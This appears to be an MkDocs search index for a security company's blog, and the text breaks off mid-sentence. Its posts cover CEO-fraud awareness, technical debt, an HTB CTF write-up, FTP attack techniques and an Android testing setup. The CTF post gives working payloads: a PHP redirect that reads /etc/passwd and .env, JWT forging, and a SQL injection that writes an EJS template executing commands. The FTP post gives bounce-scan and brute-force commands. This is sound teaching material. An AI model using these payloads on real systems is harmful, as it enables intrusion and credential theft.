{"config":{"lang":["en","es"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Atlansec","text":"<p>Welcome to Material for MkDocs.</p>"},{"location":"blog/","title":"Welcome to our Blog","text":""},{"location":"blog/posts/02-02-2025/","title":"The Costly Lesson of CEO Fraud: Why Employee Cybersecurity Training is Crucial","text":"<p>January 16, 2016 \u2013 Ried im Innkreis, Austria. At the offices of FACC Operations GmbH (an Austrian manufacturer of aerospace components), an employee from the finance department received an urgent email that appeared to come directly from the company\u2019s CEO.</p> <p>The request was clear: a million-euro transfer was needed to finalize a \"strategic project\".</p> <p>Under pressure due to the \"confidential\" nature of the request and the authority of the sender, the employee proceeded with the transaction without verifying its legitimacy.</p> <p>A few days later, FACC discovered it had been scammed. The email had not come from the real CEO but from cybercriminals who had forged his identity. As a result, the company lost approximately 42 million euros in a single bank transfer. </p> <p>This case shows how lack of cybersecurity awareness and training can lead to massive financial losses, not necessarily due to technical failures or software vulnerabilities, but rather the human factor.</p>"},{"location":"blog/posts/02-02-2025/#why-invest-resources-in-employee-training","title":"Why Invest Resources in Employee Training?","text":"<ul> <li>The Most Vulnerable Link</li> </ul> <p>Even if you have state-of-the-art technological measures, if staff aren\u2019t vigilant, employees become the easiest entry point for attackers.</p> <ul> <li>Social Engineering and Manipulation</li> </ul> <p>Phishing and BEC attacks exploit trust and authority rather than hacking technical vulnerabilities.</p> <ul> <li>Economic and Reputational Consequences</li> </ul> <p>A single fraudulent transaction can cause multi-million-euro losses and irreparable damage to a company's reputation.</p> <ul> <li>False Sense of Security</li> </ul> <p>Thinking, \"This won't happen to us\", is a serious mistake. Cybercriminals continuously refine their methods, targeting organizations of all sizes.</p>"},{"location":"blog/posts/02-02-2025/#how-can-we-prevent-these-situations","title":"How Can We Prevent These Situations?","text":"<ul> <li>Continuous Training</li> </ul> <p>Organize workshops, webinars, and phishing or BEC attack simulations. Teach employees to spot suspicious emails, slightly altered sender addresses, and exaggerated urgency or confidentiality tactics.</p> <ul> <li>Internal Verification Policies</li> </ul> <p>Establish protocols that require phone or in-person confirmation for high-value transfers. Demand dual approval or signatures from multiple executives for large financial transactions.</p> <ul> <li>Multi-Factor Authentication (MFA)</li> </ul> <p>A username and password alone are not enough. Two-step or multi-step verification (one-time  codes, authentication apps, physical tokens) makes unauthorized access more difficult, especially when credentials are compromised through phishing.</p> <ul> <li>Culture of \u201cConstructive Distrust\u201d</li> </ul> <p>Encourage employees to report or question the legitimacy of an email whenever in doubt, without fear of repercussions. Create clear channels of communication to quickly report anomalies.</p>"},{"location":"blog/posts/02-02-2025/#conclusions","title":"Conclusions","text":"<p>The FACC case proves that a single human lapse can cause millions in losses and severe reputational damage. There was no malware, no network breach\u2014just a well-crafted email that exploited human trust.</p> <p>Cybersecurity is not just about firewalls and antivirus software\u2014it\u2019s about building a security-first culture through training, awareness, and strict protocols. When every employee understands the risks and knows how to respond, the human factor transforms from the weakest link into the first line of defence.</p> <p>Regular phishing simulations are essential for strengthening a company's cybersecurity posture. Cybercriminals continuously refine their tactics, making employees the first line of defence against attacks like Business Email Compromise (BEC) and credential theft. By conducting periodic phishing tests, organizations can reinforce security awareness, and train staff to recognize and report suspicious emails. This proactive approach reduces human error, minimizes financial and reputational risks, and fosters a security-conscious culture within the company.</p>"},{"location":"blog/posts/02-02-2025/#other-cases","title":"Other Cases","text":""},{"location":"blog/posts/02-02-2025/#google-and-facebook","title":"Google and Facebook","text":"<p>A Lithuanian scammer sent fraudulent emails for several years, posing as a hardware supplier. Both Google and Facebook transferred funds totalling over $100 million. Read more on BBC | Read more on CNBC </p>"},{"location":"blog/posts/02-02-2025/#toyota-boshoku","title":"Toyota Boshoku","text":"<p>A Toyota subsidiary transferred approximately $37 million to cybercriminals after receiving genuine-looking fraudulent emails disguised as supplier communications. Read more on Tripwire </p>"},{"location":"blog/posts/02-02-2025/#crelan-bank","title":"Crelan Bank","text":"<p>Belgium\u2019s Crelan Bank lost \u20ac70 million in a Business Email Compromise (BEC) attack, where cybercriminals posed as high-ranking executives to request transfers. Read more on Help Net Security </p> <p>Stay safe. Stay smart. Stay secure.</p>"},{"location":"blog/posts/08-12-2024/","title":"Challenge, Train, Flag: Blueprint Heist","text":"<p>At Atlansec, we are committed to CTFs as a key learning tool under the learning by doing methodology. We believe that facing practical challenges is the best way to develop technical skills and foster creativity. With this section we want to spread the value of CTFs, share writeups of challenges of a certain technical complexity and bring the community closer to a practical and technical approach to learning.</p>"},{"location":"blog/posts/08-12-2024/#what-is-a-ctf","title":"What is a CTF?","text":"<p>Capture the Flag (CTF) competitions are cybersecurity challenges where participants tackle a variety of technical problems to find \"flags\", which are hidden markers proving successful completion of a task. CTFs simulate real-world scenarios in areas like cryptography, reverse engineering, web security, forensics, and binary exploitation, helping participants build essential cybersecurity skills.</p> <p>CTFs aren't just competitions; they are a gateway to learning by solving. They teach participants how to think critically, debug complex systems, and adapt under pressure. Each challenge is a story, a puzzle, and a lesson rolled into one.</p> <p>In this series, we'll explore notable CTF challenges, dive into their technical solutions, and highlight the skills they develop. Welcome to Challenge, Train, Flag!</p>"},{"location":"blog/posts/08-12-2024/#key-concepts","title":"Key concepts","text":"<ul> <li> <p>SSRF (Server-Side Request Forgery): Technique that allows an attacker to force a server to make HTTP requests on their behalf. Depending on the context, it can be quite critical as it can allow an attacker to access resources within the target's internal network.</p> </li> <li> <p>JSON Web Token (JWT): An open standard for authenticating and securely transferring information using a token.</p> </li> <li> <p>SQL Injection: An attack that allows malicious SQL code to be injected into a query to manipulate the database query.</p> </li> <li> <p>wkhtmltopdf: Library for converting web content (HTML) to PDF.</p> </li> </ul>"},{"location":"blog/posts/08-12-2024/#the-challenge","title":"The challenge","text":"<p>This time we bring you a challenge from the HTB Business CTF 2024. The challenge is from the web category and although it is listed as easy on the HackTheBox platform, it is one of the most complex web challenges on the platform due to the number of steps that make up the solution.</p> <p>In this challenge we are given the source code of a NodeJS application and access to a web service running the application.</p>"},{"location":"blog/posts/08-12-2024/#understanding-the-application-logic","title":"Understanding the Application Logic","text":"<p>The challenge starts with access to an application of the urban planning commission. When browsing, we notice that clicking on any of the links generates a POST request to the /download path. Let's review its implementation in the routes file:</p> <pre><code>router.post(\"/download\", authMiddleware(\"guest\"), (req, res, next) =&gt; {\n    convertPdf(req, res, next);\n});\n</code></pre> <p>Here we can see that the convertPdf function is responsible for handling the logic of this path. Let's go on to examine its code:</p> <pre><code>async function convertPdf(req, res, next) {\n    try {\n        const { url } = req.body;\n\n        if (!isUrl(url)) {\n            return next(generateError(400, \"Invalid URL\"));\n        }\n\n        const pdfPath = await generatePdf(url);\n        res.sendFile(pdfPath, { root: \".\" });\n    } catch (error) {\n        return next(generateError(500, error.message));\n    }\n}\n</code></pre> <p>After reading this, we can see that the function makes sure that the parameter it receives is a valid URL before passing it to the generatePdf function. Let's look at the latter next:</p> <pre><code>async function generatePdf(urls) {\n    const pdfFilename = generateRandomFilename();\n    const pdfPath = `uploads/${pdfFilename}`;\n\n    try {\n        await generatePdfFromUrl(urls, pdfPath);\n        return pdfPath;\n    } catch (error) {\n        throw new Error(`Error generating PDF: ${error.stack}`);\n    }\n}\n\nasync function generatePdfFromUrl(url, pdfPath) {\n    return new Promise((resolve, reject) =&gt; {\n        wkhtmltopdf(url, { output: pdfPath }, (err) =&gt; {\n            if (err) {\n                reject(err);\n            } else {\n                resolve();\n            }\n        });\n    });\n}\n</code></pre> <p>We note that the generatePdfFromUrl function uses wkhtmltopdf to convert the URL content to a PDF file. This flow opens the door to exploit a SSRF vulnerability in the library.</p>"},{"location":"blog/posts/08-12-2024/#ssrf-to-local-file-read-on-wkhtmltopdf","title":"SSRF to local file read on wkhtmltopdf","text":"<p>Using an attacker-controlled server, we can serve files on a web server to redirect the visitor to local file system locations, in this case converting the SSRF on the server into a way to read internal files such as /etc/passwd. To do this, we create a PHP file with the following content:</p> <pre><code>&lt;?php header('location:file:///etc/passwd'); ?&gt;\n</code></pre> <p>By passing the URL of our server as a parameter to the /download path, the generated PDF will contain the contents of the /etc/passwd file of the server making the request.</p> Reading /etc/passwd with the PDF generator <p>We then modify the PHP file to exfiltrate the application's .env file:</p> <pre><code>&lt;?php header('location:file:///app/.env'); ?&gt;\n</code></pre> Reading env file with the PDF generator"},{"location":"blog/posts/08-12-2024/#jwt-forging","title":"JWT Forging","text":"<p>With the key extracted from the .env file, we can sign valid JWT tokens. We use a tool like JWT.io to generate a token with the administrator role:</p> <pre><code>{\n  \"role\": \"admin\"\n}\n</code></pre> Edit JWT token on JWT.io <p>Using the token we have generated, we will make a request to the internal admin panel endpoint with the following structure:</p> <pre><code>http://127.0.0.1:1337/admin?token=&lt;JWT_admin&gt;\n</code></pre> <p>In the generated PDF we can see the contents of the admin panel.  While this generates a screenshot of the admin panel, it only takes us halfway to our ultimate goal.</p> PDF with the content of the admin panel"},{"location":"blog/posts/08-12-2024/#sql-injection-to-file-upload","title":"SQL injection to file upload","text":"<p>Analysing the rest of the application code, we discovered that the GraphQL endpoint is vulnerable to SQL injection in the getDataByName query. However, a robust regular expression is used to filter out malicious entries:</p> <pre><code>function detectSqli(query) {\n    const pattern = /^.*[!#$%^&amp;*()\\-_=+{}\\[\\]\\\\|;:'\\\",.&lt;&gt;\\/\\?]/;\n    return pattern.test(query);\n}\n</code></pre> <p>A more detailed analysis shows that the expression is not multiline, which allows us to bypass it with a line break (<code>n</code>).</p> <ul> <li>No line break.</li> </ul> The regex match our payload <ul> <li>With a line break.</li> </ul> The regex doesn\u00b4t match our payload <p>Once this is discovered, we can build a payload for an SQL injection that writes a malicious EJS file to the 404 error path, since the application does not have a path to handle this type of error.</p> <p>The payload we build should be similar to the following, where we include an EJS template that reads the flag by executing the target binary.</p> <pre><code>' UNION SELECT 1, '&lt;p&gt;&lt;%= process.mainModule.require(\"child_process\").execSync(\"/readflag\") %&gt;&lt;/p&gt;', 2, 3 INTO OUTFILE '/app/views/errors/404.ejs'--\n</code></pre> <p>With the malicious file in place, we access a non-existent path to throw a 404 error and execute the /readflag command. This gives us access to the contents of the flag.</p> Reading the flag"},{"location":"blog/posts/09-02-2025/","title":"Technical Debt: A Necessary Evil in Software Development","text":"<p>At Atlansec, while we are primarily a cybersecurity company, we also address technical debt from the perspective of secure software development and infrastructure security. Building secure code and robust infrastructures is key to reducing vulnerabilities and ensuring long-term maintainability.</p> <p>Technical debt is an inevitable enemy that accompanies all software projects to a greater or lesser extent. However, it is not always harmful and, in some cases, can be a necessary strategy to achieve critical objectives within a given timeframe.</p>"},{"location":"blog/posts/09-02-2025/#what-is-technical-debt","title":"What is technical debt?","text":"<p>Technical debt represents the cost of fixing suboptimal or poorly implemented code that results from accelerating development to meet deadlines. It is the price paid when speed is prioritized over software quality.</p> <p>Its origin lies in the need to quickly release new functionalities, often sacrificing fundamental aspects such as maintainability and code clarity. But is it always negative?</p>"},{"location":"blog/posts/09-02-2025/#is-technical-debt-inherently-bad","title":"Is technical debt inherently bad?","text":"<p>It depends on the context. Accelerating development in a controlled manner to meet a critical deadline is not the same as writing messy code due to ignorance or lack of good practices.</p> <p>Asana summarizes this concept well into four quadrants of technical debt:</p> Asana tech debt quadrant"},{"location":"blog/posts/09-02-2025/#the-4-quadrants-of-technical-debt","title":"The 4 Quadrants of Technical Debt","text":"<ol> <li>Prudent and Deliberate: The conscious decision to implement a quick solution and deal with the consequences later. This type of debt is acceptable when the risk is low, and the advantages of rapid delivery outweigh the disadvantages.</li> <li>Reckless and Deliberate: Having the knowledge and capability to write good code but choosing to prioritize speed without a strategy to mitigate the resulting debt. This approach often leads to long-term problems.</li> <li>Prudent and Inadvertent: Trying to produce the best possible code but later discovering a better solution. In this case, the debt is not due to bad practices but rather the natural learning and evolution of the software.</li> <li>Reckless and Inadvertent: Debt is generated without awareness, either due to ignorance or lack of experience in good development practices. This type of debt is particularly risky as it can accumulate without the team realizing it.</li> </ol>"},{"location":"blog/posts/09-02-2025/#types-of-technical-debt","title":"Types of Technical Debt","text":""},{"location":"blog/posts/09-02-2025/#1-intentional","title":"1. Intentional","text":"<p>This type of debt is generated when deliberate decisions are made to prioritize functionality delivery, knowing that the code will require improvements in the future. It is common in projects with tight deadlines or when an idea needs to be validated before optimizing the code.</p>"},{"location":"blog/posts/09-02-2025/#2-unintentional","title":"2. Unintentional","text":"<p>It occurs due to errors, lack of knowledge, or poorly written code without the team being aware of the consequences. This debt is often the most dangerous as it can accumulate to an unmanageable level.</p>"},{"location":"blog/posts/09-02-2025/#examples-of-technical-debt","title":"Examples of Technical Debt","text":"<p>Technical debt appears in many forms and can arise from various causes. Below are some common examples found in software development projects:</p> <ul> <li>Architectural Technical Debt: A deficient architectural design can lead to significant long-term problems. For example:</li> <li>Difficult-to-scale monoliths: A single code block can make scalability and flexibility challenging.</li> <li>Poor separation of concerns: A poorly designed architecture can hinder modularity and code reuse.</li> <li>Excessive dependencies: High coupling between components makes modifications costly and risky.</li> <li>Lack of architectural documentation: Without clear guidance, the team can make decisions that exacerbate technical debt.</li> <li>Insufficient documentation: Projects with poor or nonexistent documentation can lead developers to misinterpret code purposes, features, or architecture. This creates a knowledge gap, which can accumulate technical debt when incorrect assumptions are made or when new developers struggle to understand the system.</li> <li>Duplicated code: Redundant code or copying and pasting code in different parts of the system suggests that the team has not adequately considered code reuse opportunities.</li> <li>Outdated libraries or APIs: If a project relies on outdated libraries or APIs, it will become increasingly difficult to secure, maintain, and expand as those dependencies become unsupported.</li> </ul>"},{"location":"blog/posts/09-02-2025/#impact-of-technical-debt","title":"Impact of Technical Debt","text":"<p>Technical debt can have a significant impact on software development and business operations. Some negative consequences include:</p>"},{"location":"blog/posts/09-02-2025/#development-delays","title":"Development Delays","text":"<p>As technical debt accumulates, the time required to implement new features or fix issues increases. The shortcuts taken initially result in greater effort and more time spent later.</p>"},{"location":"blog/posts/09-02-2025/#higher-maintenance-costs","title":"Higher Maintenance Costs","text":"<p>Maintaining software with technical debt requires more time and resources. Underlying issues must be addressed before additional changes or improvements can be made, increasing long-term operational costs.</p>"},{"location":"blog/posts/09-02-2025/#lower-software-quality","title":"Lower Software Quality","text":"<p>Technical debt often translates into low-quality code, which can lead to frequent errors and failures. This affects customer satisfaction and the company's reputation.</p>"},{"location":"blog/posts/09-02-2025/#difficulty-in-attracting-and-retaining-talent","title":"Difficulty in Attracting and Retaining Talent","text":"<p>Skilled developers prefer to work on well-maintained and technically solid projects. Accumulating technical debt can make it harder to hire and retain qualified personnel.</p>"},{"location":"blog/posts/09-02-2025/#how-to-manage-and-reduce-technical-debt","title":"How to Manage and Reduce Technical Debt","text":"<p>At Atlansec, we understand that managing technical debt is crucial to the success of any software project. Therefore, we adopt a proactive approach based on the following strategies:</p>"},{"location":"blog/posts/09-02-2025/#1-continuous-refactoring","title":"1. Continuous Refactoring","text":"<p>Adopting a culture of continuous refactoring helps improve code quality without affecting the delivery of new features. Frequent small adjustments can prevent technical debt accumulation.</p>"},{"location":"blog/posts/09-02-2025/#2-code-reviews","title":"2. Code Reviews","text":"<p>Code reviews allow problems to be identified before they become debt. Encouraging collaboration among developers ensures better practices and higher code quality.</p>"},{"location":"blog/posts/09-02-2025/#3-automating-testing-and-cicd","title":"3. Automating Testing and CI/CD","text":"<p>Using automated testing and continuous integration/deployment (CI/CD) pipelines enables rapid issue detection and prevents the accumulation of unintentional technical debt.</p>"},{"location":"blog/posts/09-02-2025/#4-documentation-and-best-practices","title":"4. Documentation and Best Practices","text":"<p>Writing clear documentation and following established design patterns facilitates code maintainability and reduces the risk of generating debt due to misunderstandings.</p>"},{"location":"blog/posts/09-02-2025/#5-planning-technically-from-the-beginning","title":"5. Planning Technically from the Beginning","text":"<p>Focusing on proper architectural design before development begins can prevent long-term problems. Investing time in planning avoids many rushed decisions that generate debt.</p>"},{"location":"blog/posts/09-02-2025/#related-links","title":"Related Links","text":"<ul> <li>Asana - Technical Debt</li> <li>Atlassian - Technical Debt in Agile</li> </ul>"},{"location":"blog/posts/14-11-2024/","title":"Intro to FTP","text":"<p>FTP (File Transfer Protocol) is one of the oldest and most widely used protocols for transferring files between computers. While it provides a simple way to move data, its default configuration lacks security, making it a common target for attackers. In this article, we\u2019ll cover the basics of FTP, its communication modes, essential commands, and common misconfigurations that could be exploited. Whether you're a cybersecurity enthusiast or a penetration tester, understanding FTP is crucial for securing or assessing network environments.</p> <p>This protocol has a client-server architecture using a server to serve files that can be accessed by N clients. By default, the information is transmitted in plain text, although there is an encrypted version of it called SFTP (Secure File Transfer Protocol).</p> <p>Although there are implementations with a graphical interface, in this article we will make use of the FTP command line tool, which gives us a lot of flexibility when working with the protocol. In later articles we will explore the main client and server implementations, although in this one we will focus on explaining the basic concepts of the protocol, how to work with it and how to take advantage of some misconfigurations.</p>"},{"location":"blog/posts/14-11-2024/#theory","title":"Theory","text":""},{"location":"blog/posts/14-11-2024/#communication-channels","title":"Communication channels","text":"<p>For FTP to work, two communication channels are required, one for sending commands and the other for data.</p>"},{"location":"blog/posts/14-11-2024/#connection-modes","title":"Connection modes","text":""},{"location":"blog/posts/14-11-2024/#active","title":"Active","text":"<p>This is the default connection mode for FTP connections, in which two events occur:</p> <ul> <li>A command channel is established in the connection to the server between the server's command port (21 by default) and a port greater than 1023 on the client side (we will refer to this as P).</li> <li>Once the data connection is established, an attempt is made to open a connection from the server's data port (20 by default) to port P+1 on the client.</li> </ul> <p>Note</p> <p>Active mode may present problems with client firewalls because it attempts to create a direct connection to a client-side port, which may be blocked by certain firewalls.</p>"},{"location":"blog/posts/14-11-2024/#passive","title":"Passive","text":"<p>This mode arises as a solution to the problem of client firewalls, here the workflow is modified so that both the data connection and the client connection are initiated from the client, we can break it down into two events.</p> <ul> <li>A command channel is established on the server connection between the server command port (21 by default) and a port greater than 1023 on the client side (we will refer to this as P).</li> <li>Once the data connection is established a data connection is opened from port P+1 on the client to a port on the server data channel, this process is repeated for each file transfer occupying a different server port on each connection (this can be configured in most server side software) .</li> </ul> <p>Note</p> <p>Passive mode requires the opening of a range of ports in the firewall, this can generate some security problems if this port opening is not configured correctly.</p>"},{"location":"blog/posts/14-11-2024/#ftp-commands","title":"FTP commands","text":"<pre><code>CWD -&gt; Changes the current directory to the specified one\nDELE -&gt; Deletes the specified file\nEPRT -&gt; Establish a socket for data connection\nLIST -&gt; List the files in the current directory\nPASV -&gt; Change mode to passive mode\nPWD -&gt; Displays the current directory \nRETR -&gt; Download the specified file\n</code></pre>"},{"location":"blog/posts/14-11-2024/#anonymous-login","title":"Anonymous login","text":"<p>There is an FTP configuration that allows the use of a login to share files for any user that requires it, in case this configuration is enabled a user could use anonymous as login name and any password to access the server as a user with low privileges, although in certain cases this can lead to compromise the entire system.</p>"},{"location":"blog/posts/14-11-2024/#ftp-bounce-port-scan","title":"FTP Bounce port scan","text":"<p>It is possible to abuse the PORT and ERPT commands to perform an open port scan via an FTP server.</p>"},{"location":"blog/posts/14-11-2024/#nmap","title":"Nmap","text":"<pre><code>nmap -b &lt;name&gt;:&lt;pass&gt;@&lt;ftp_server&gt; &lt;victim&gt;\n</code></pre>"},{"location":"blog/posts/14-11-2024/#hand-made","title":"Hand-made","text":"<p>Once connected we can perform the port scan using the PORT and ERPT commands followed by a LIST command.</p> <p>Here is an example for scanning port 9091 on host 10.10.10.14</p> <pre><code>PORT 10.10.10.14.14.0.9091\nEPRT |2|10.10.10.14|9091||\n\nLIST\n</code></pre> <p>If the response is a 150 the port is open, in case of receiving a 415 the port is closed.</p>"},{"location":"blog/posts/14-11-2024/#ftp-bounce-file-get","title":"FTP Bounce file get","text":"<p>This attack allows an attacker to download files from an FTP server not accessible by the attacker, but which can be reached by an FTP server accessible by the attacker.</p> Net Diagram <p>This attack has the following prerequisites:</p> <ul> <li>Valid credentials for External FTP.</li> <li>Valid credentials for Internal FTP.</li> <li>Write access for External FTP.</li> <li>PORT command execution permissions on both External and Internal.</li> </ul> <p>First of all we will deploy an FTP server on the attacker's machine, this server has to support passive mode.</p> <p>Once deployed we will open a passive connection with the PASV command and tell it to save it with STOR output.ext .</p> <p>Now we will create a file with the commands we want to launch against the second server, an example would be the following:</p> <pre><code>user ftp # User for the internal server\npass password # Password for the internal server\ncwd /DIRECTORY\ntype i\nport F,F,F,F,F,F,X,X #Our passive port\nretr file.ext\nquit\n^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@ ... ^@^@^@^@\n^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@ ... ^@^@^@^@\n</code></pre> <p>Now we upload it with PUT and from the external server we execute the following commands:</p> <pre><code>put payload\nquote \"port C,C,C,C,C,0,21\" # IP of internal server\nquote \"retr payload\"\n</code></pre> <p>After this we will have the file.ext file on our server as output.ext</p>"},{"location":"blog/posts/14-11-2024/#brute-force-attack","title":"Brute force attack","text":"<p>Many FTP servers do not have protection against brute force attacks. Having a user or a list of them we can carry out a brute force attack with different credentials obtained from various sources, although there are several tools for this purpose, the two most common are NetExec and Hydra.  </p>"},{"location":"blog/posts/14-11-2024/#netexec","title":"NetExec","text":"<pre><code>nxc ftp IP -u userfile -p passwordfile\n</code></pre>"},{"location":"blog/posts/14-11-2024/#hydra","title":"Hydra","text":"<pre><code>hydra -L userfile -P passwordfile ftp://IP\n</code></pre>"},{"location":"blog/posts/14-11-2024/#full-content-backup","title":"Full content backup","text":"<p>This is not an attack per se, but it is quite useful, as it allows us to download all accessible files from the server using a single command.</p> <pre><code>wget -r ftp://IP/dir/* --ftp-user=username --ftp-password=password\n</code></pre>"},{"location":"blog/posts/14-11-2024/#ftp-file-upload-to-rce","title":"FTP file upload to RCE","text":"<p>In certain circumstances, permission to upload files to the server along with other misconfigurations can lead to obtaining remote execution of commands on the server.</p> <p>The most common case is the possibility of uploading files to be served by a web server, where we could upload a webshell interpretable by the server to obtain command execution.</p>"},{"location":"blog/posts/14-11-2024/#sniffing-credentials","title":"Sniffing credentials","text":"<p>Since FTP works by default in plain text, it is possible for an attacker on the same network to use a sniffer and capture both the credentials and the FTP conversation.</p> <p>In the next article of this series on FTP we will discuss common implementation errors and some known vulnerabilities of some implementations of the protocol.</p>"},{"location":"blog/posts/15-12-2024/","title":"Installation and Configuration of Android Studio and Related Tools on Linux/Debian","text":"<p>This article outlines the necessary steps to create a dynamic testing environment on Linux/Debian, detailing how to integrate tools such as Burp Suite, Frida, and Objection, and their specific purposes. It also covers procedures for managing certificates on an Android emulator and configuring a dynamic testing environment. Follow the detailed instructions to achieve a functional and analysis-ready setup.</p>"},{"location":"blog/posts/15-12-2024/#installing-android-studio","title":"Installing Android Studio","text":"<p>Android Studio serves as the primary IDE for Android application development and testing, providing an environment for app creation, emulation, and debugging, we are going to use this for easy download and installation of avds.</p>"},{"location":"blog/posts/15-12-2024/#step-1-download-android-studio","title":"Step 1: Download Android Studio","text":"<ol> <li>Download the Android Studio ZIP file from the official Android Studio page.</li> </ol>"},{"location":"blog/posts/15-12-2024/#step-2-extraction-and-setup","title":"Step 2: Extraction and Setup","text":"<p>Extract the downloaded file:</p> <pre><code>unzip android-studio-*.zip -d ~/android-studio\n</code></pre>"},{"location":"blog/posts/15-12-2024/#step-3-create-symbolic-links","title":"Step 3: Create Symbolic Links","text":"<p>To streamline the use of Android Studio and the emulator, create symbolic links:</p> <pre><code>sudo ln -s ~/android-studio/bin/studio.sh /usr/local/bin/androidStudio\nsudo ln -s ~/android-studio/emulator/emulator /usr/local/bin/androidEmulator\n</code></pre> <p>Now you can run Android Studio with:</p> <pre><code>androidStudio\n</code></pre> <p>And the emulator with:</p> <pre><code>androidEmulator\n</code></pre>"},{"location":"blog/posts/15-12-2024/#step-4-use-a-physical-device-optional","title":"Step 4: Use a Physical Device (Optional)","text":"<p>Although this guide primarily uses an Android emulator, you can opt to use a physical device for a more realistic experience. This requires enabling developer options and USB debugging on your device.</p> <ol> <li>Enable Developer Options:</li> <li> <p>Go to Settings &gt; About Phone and tap Build Number several times until developer options are enabled.</p> </li> <li> <p>Enable USB Debugging:</p> </li> <li>In Settings &gt; Developer Options, enable USB Debugging.</li> </ol> <p>Connect your device to the computer via USB. You can now use <code>adb</code> commands to install apps, debug, and perform the same tests as with the emulator.</p>"},{"location":"blog/posts/15-12-2024/#installing-burp-certificates-on-an-android-emulator","title":"Installing Burp Certificates on an Android Emulator","text":"<p>Burp Suite is used to intercept and analyze traffic between the Android application and backend servers. Installing its certificate allows HTTPS traffic to be decrypted for analysis.</p>"},{"location":"blog/posts/15-12-2024/#step-1-start-the-emulator-with-a-writable-system","title":"Step 1: Start the Emulator with a Writable System","text":"<ol> <li> <p>List available AVDs (Android Virtual Devices) with the <code>-list-avds</code> option: <pre><code>androidEmulator -list-avds\n</code></pre></p> </li> <li> <p>Start the emulator with the <code>-writable-system</code> option: <pre><code>androidEmulator -avd &lt;avd_name&gt; -writable-system\n</code></pre></p> </li> </ol>"},{"location":"blog/posts/15-12-2024/#step-2-export-the-certificate-from-burp-suite","title":"Step 2: Export the Certificate from Burp Suite","text":"<ol> <li>From Burp Suite, export the certificate in DER format:</li> <li>Go to Proxy &gt; Options &gt; Import/export CA certificate.</li> <li>Export the file as <code>burp-cert.der</code>.</li> </ol>"},{"location":"blog/posts/15-12-2024/#step-3-convert-and-copy-the-certificate-to-the-emulator","title":"Step 3: Convert and Copy the Certificate to the Emulator","text":"<ol> <li> <p>Convert the certificate from DER to PEM format: <pre><code>openssl x509 -inform DER -in burp-cert.der -out burp-cert.pem\n</code></pre></p> </li> <li> <p>Get the certificate hash: <pre><code>openssl x509 -inform PEM -subject_hash_old -in burp-cert.pem | head -1\n</code></pre></p> </li> <li> <p>Rename the certificate using its hash: <pre><code>mv burp-cert.pem 9a5ba575.0\n</code></pre></p> </li> <li> <p>Push the certificate to the emulator: <pre><code>adb root\nadb remount\nadb push 9a5ba575.0 /sdcard/\nadb shell mv /sdcard/9a5ba575.0 /system/etc/security/cacerts/\nadb shell chmod 644 /system/etc/security/cacerts/9a5ba575.0\n</code></pre></p> </li> </ol>"},{"location":"blog/posts/15-12-2024/#step-4-verification","title":"Step 4: Verification","text":"<p>Restart the emulator and verify the installation by checking Settings &gt; Security &gt; Trusted Credentials for the \"PortSwigger CA\" certificate.</p>"},{"location":"blog/posts/15-12-2024/#installing-frida-and-objection-in-a-python-virtual-environment","title":"Installing Frida and Objection in a Python Virtual Environment","text":"<p>Frida is a dynamic instrumentation toolkit for debugging, testing, and reverse engineering Android applications. Objection is a wrapper for Frida that simplifies security assessments by automating common testing tasks.</p>"},{"location":"blog/posts/15-12-2024/#step-1-create-a-virtual-environment","title":"Step 1: Create a Virtual Environment","text":"<ol> <li> <p>Create a Python virtual environment to isolate tool dependencies: <pre><code>python3 -m venv frida-env\n</code></pre></p> </li> <li> <p>Activate the virtual environment: <pre><code>source frida-env/bin/activate\n</code></pre></p> </li> </ol>"},{"location":"blog/posts/15-12-2024/#step-2-install-frida-and-objection","title":"Step 2: Install Frida and Objection","text":"<ol> <li>Install both tools using <code>pip</code>: <pre><code>pip install frida-tools objection\n</code></pre></li> </ol>"},{"location":"blog/posts/15-12-2024/#configuring-frida-server-on-the-emulator","title":"Configuring Frida-Server on the Emulator","text":"<p>The Frida server facilitates communication between the Frida client on your host machine and the Android emulator for live application instrumentation.</p>"},{"location":"blog/posts/15-12-2024/#step-1-download-the-frida-server-file","title":"Step 1: Download the Frida-Server File","text":"<ol> <li> <p>Download the <code>frida-server</code> binary from the official Frida releases page.</p> </li> <li> <p>Extract the downloaded file.</p> </li> </ol>"},{"location":"blog/posts/15-12-2024/#step-2-upload-and-configure-frida-server-on-the-emulator","title":"Step 2: Upload and Configure Frida-Server on the Emulator","text":"<ol> <li> <p>Push the <code>frida-server</code> binary to the emulator: <pre><code>adb push frida-server /data/local/tmp/\nadb shell chmod 755 /data/local/tmp/frida-server\n</code></pre></p> </li> <li> <p>Start the Frida server: <pre><code>adb shell /data/local/tmp/frida-server &amp;\n</code></pre></p> </li> </ol>"},{"location":"blog/posts/15-12-2024/#step-3-verification","title":"Step 3: Verification","text":"<p>Ensure Frida is working by listing processes on the emulator:</p> <pre><code>frida-ps -U\n</code></pre>"},{"location":"blog/posts/15-12-2024/#method-inspection-revisiting-crackme-1","title":"Method Inspection: Revisiting Crackme 1","text":"<p>To demonstrate the power of dynamic analysis, we will use the \"Uncrackable1\" APK to explore how these techniques can be applied in practice.</p>"},{"location":"blog/posts/15-12-2024/#exploring-the-application-with-apklab","title":"Exploring the Application with APKLab","text":"<p>To understand the application better, decompile the APK to reveal its Java source code using the APKLab extension for Visual Studio Code. This extension integrates with tools like JADX to simplify the process.</p>"},{"location":"blog/posts/15-12-2024/#step-1-set-up-apklab","title":"Step 1: Set up APKLab","text":"<ol> <li>Install APKLab from the Visual Studio Code extensions marketplace.</li> <li>Open the APK file in APKLab to automatically decompile the application and display the code.</li> </ol> APK Lab Visual Studio Extension"},{"location":"blog/posts/15-12-2024/#step-2-locate-root-detection-code","title":"Step 2: Locate Root Detection Code","text":"<ol> <li> <p>Use the search functionality in APKLab to locate code responsible for root detection by searching for phrases like \"Root detected.\"</p> </li> <li> <p>Navigate to the implementation by clicking on the search results.</p> </li> </ol>"},{"location":"blog/posts/15-12-2024/#bypassing-root-detection","title":"Bypassing Root Detection","text":"<p>We can bypass root detection by modifying what methods like <code>c.a()</code>, <code>c.b()</code>, and <code>c.c()</code> return. Alternatively, we can change the implementation of the <code>onClick()</code> method in <code>MainActivity</code>, which closes the app when \"OK\" is clicked on the alert.</p>"},{"location":"blog/posts/15-12-2024/#using-frida-to-instrument-the-app","title":"Using Frida to Instrument the App","text":""},{"location":"blog/posts/15-12-2024/#step-1-find-the-process-id","title":"Step 1: Find the Process ID","text":"<p>List 